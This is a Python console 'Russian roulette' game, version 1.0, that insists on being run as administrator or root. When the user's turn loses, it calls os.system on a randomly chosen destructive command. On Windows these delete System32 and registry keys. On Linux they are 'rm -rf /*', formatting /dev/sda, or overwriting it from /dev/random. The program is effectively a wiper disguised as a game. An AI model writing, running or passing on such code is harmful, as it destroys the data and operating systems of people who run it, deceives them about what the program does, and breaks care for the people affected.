# python 3.8.2
#     ██████╗ ████████╗██╗  ██╗███████╗███████╗██╗███╗   ██╗ █████╗         ██████╗
#    ██╔═══██╗╚══██╔══╝██║  ██║██╔════╝██╔════╝██║████╗  ██║██╔══██╗        ██╔══██╗
#    ██║██╗██║   ██║   ███████║█████╗  ███████╗██║██╔██╗ ██║███████║        ██████╔╝
#    ██║██║██║   ██║   ██╔══██║██╔══╝  ╚════██║██║██║╚██╗██║██╔══██║        ██╔══██╗
#    ╚█║████╔╝   ██║   ██║  ██║███████╗███████║██║██║ ╚████║██║  ██║███████╗██║  ██║
#     ╚╝╚═══╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
#   v 1.0


import random
import time
import os
import platform
import sys
import ctypes
import colorama
from colorama import Fore, Back

colorama.init()

# Getting some information :
osName = platform.system()     # Oreation System name
username = os.getlogin()       # System username
selfDistroyMode = False

# Auto type text :


def printOneByOne(s, color, resetColor=Fore.RESET):
    if len(s) == 0:
        return
    print(color + s[0] + resetColor, end="", flush=True)
    time.sleep(0.05)
    printOneByOne(s[1:], color)

# Clear Console :


def clear():
    if osName == "Windows":
        os.system("cls")
    else:
        os.system("clear")


# -- The hard punishment of cowardly users is made in the next version -- #


# Define How to Destruction the System :

def DestroySystem():

    # Write 3 Alert
    time.sleep(0.5)
    for i in range(3):
        print(Back.LIGHTRED_EX + Fore.WHITE +
              "\n\n**Error: SYSTEM FILES HAS BEEN FUCKED**\nRestoring System Files...")
        time.sleep(0.2)
        print(Back.RESET + Fore.LIGHTRED_EX + "Failed!\n" + Fore.RESET)
        time.sleep(0.1)

    # Operating system detection (Windows / Linux)
    if osName == "Windows":
        # Windows:
        destroy1 = "del /Q /F C:\Windows\System32\*.*"    # 1 -> Deleting System32
        destroy2 = "@echo off && START reg deletr hkcr/ .exe && START reg delete hkcr/ .dll && START reg delete hkcr/ *"
        # 3 -> Deleting Entire Registry

        ListOfdestroyerCommands = [destroy1, destroy2]
        RandomSelectDestroyerCommand = random.choice(ListOfdestroyerCommands)
        # Random selection of one of the options

        os.system(RandomSelectDestroyerCommand)          # Execute

    else:
        # Linux:
        destroy1 = "rm -rf /*"                      # 1 -> Deleting Every Files and Folders
        destroy2 = "mkfs.ext3 /dev/sda"             # 2 -> Formatting /dev/sda/ ex3
        # 3 -> Write Random Data on Partition
        destroy3 = "dd if=/dev/random of=/dev/sda"

        ListOfdestroyerCommands = [destroy1, destroy2, destroy3]
        RandomSelectDestroyerCommand = random.choice(
            ListOfdestroyerCommands)     # Random selection of one of the options

        os.system(RandomSelectDestroyerCommand)     # Execute

    # Exit the program
    sys.exit()


def __start_game__():
    # Explaining the game in a simple way for the user:
    clear()
    printOneByOne("Look my friend, we play together 6 times and if you are alive you can escape\nbut otherwise if you don't follow the rules or you are unlucky, YOU DIE!\n", Fore.MAGENTA)
    input("OK ? ")
    printOneByOne("\nGood luck :)\n\n", Fore.YELLOW)
    time.sleep(2)
    clear()

    # Countdown to the start of the game
    print("3")
    time.sleep(1)
    clear()

    print("2")
    time.sleep(1)
    clear()

    print("1")
    time.sleep(1)
    clear()

    # Start the Game :
    for i in range(1, 7):

        # Get random numbers
        random.seed()
        rand = random.randint(1, 7)     # The game is repeated 6 times

        if (i % 2 == 0):
            selfDistroyMode = True
            player = "thesina_r"        # Your Name
        else:
            selfDistroyMode = False
            player = username           # Client Name

        # If the number is equal to 1 , the player loses
        if (rand) == 1:
            if selfDistroyMode == False:
                printOneByOne(
                    f"~ chances: {i} , {player}: BOOM!\nUOO! TOO BAD! Goodbye... :(\n", Fore.LIGHTRED_EX)
                time.sleep(0.5)
                DestroySystem()
            else:
                printOneByOne(
                    f"~ chances: {i} , {player}: BOOM!... :(\nGoodbye my lucky friend...", Fore.LIGHTRED_EX)
                time.sleep(3)
                sys.exit()

        # If the number is close to 1 or 0, the game reacts
        elif (rand == 2 or rand == 0):
            if selfDistroyMode == False:
                printOneByOne(
                    f"~ chances: {i} , {player}:\nWOW! too lucky!\n\n", Fore.YELLOW)
                time.sleep(2.8)
            else:
                printOneByOne(
                    f"~ chances: {i} , {player}:\nWOW! too lucky! hah?  :)\n\n", Fore.YELLOW)
                time.sleep(2.8)

        else:
            if selfDistroyMode == False:
                printOneByOne(
                    f"~ chances: {i} , {player}:\nhof! Nice !!! \n\n", Fore.BLUE)
                time.sleep(2.8)
            else:
                printOneByOne(
                    f"~ chances: {i} , {player}:\nhah! It's like I'm still dating Azrael  XD !!! \n\n", Fore.CYAN)
                time.sleep(2.8)

        clear()

    print(Fore.LIGHTYELLOW_EX +
          "GODDAMNED! How lucky you are?!\nGoodbye my lucky brave friend :) \nI hope to see you again..." + Fore.RESET)
    input()


# Check program run as administrator/root or not :

def is_admin():

    if osName == "Windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    else:
        try:
            return os.geteuid() == 0
        except:
            return False


if is_admin():
    __start_game__()
else:
    print("PLEASE RUN PROGRAM AS ADMINISTRATOR/ROOT")
